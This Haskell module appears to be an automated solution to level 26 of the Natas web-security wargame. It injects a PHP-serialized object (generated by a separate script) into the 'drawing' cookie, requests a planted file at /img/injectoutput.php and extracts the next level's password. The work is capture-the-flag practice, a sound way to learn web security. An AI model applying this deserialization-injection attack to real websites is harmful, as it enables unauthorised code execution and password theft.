{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas26 where

import           Data.Text          (Text, pack)
import           Data.Text.Encoding (encodeUtf8)
import           Safe               (headMay, lastMay)

import           Network.Wreq       (Options, cookie, cookieValue, cookies,
                                     param, responseCookieJar)
import           System.Process     (readProcess)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  phpEncoded <- readProcess "php" ["php/natas26.php"] ""
  let form =
        (param "x1" .~ ["1"]) .
        (param "x2" .~ ["2"]) . (param "y1" .~ ["3"]) . (param "y2" .~ ["4"])
  preq <- getLevel' 26 (parentUri 26) form
  let placeJar = cookies ?~ (preq ^. responseCookieJar)
      modifyCookie =
        (cookie "drawing" . cookieValue) .~ encodeUtf8 (pack phpEncoded)
  attemptConnect (modifyCookie . placeJar)

attemptConnect :: (Options -> Options) -> IO (Maybe Text)
attemptConnect placeJar = do
  _ckireq <- getLevel' 26 (parentUri 26) placeJar
  req <- getLevel' 26 (parentUri 26 ++ "/img/injectoutput.php") placeJar
  attemptParse (reqBody req)

attemptParse :: Text -> IO (Maybe Text)
attemptParse body =
  let match = headMay (workupBody' extractPassword body)
  in pure $ match >>= lastMay
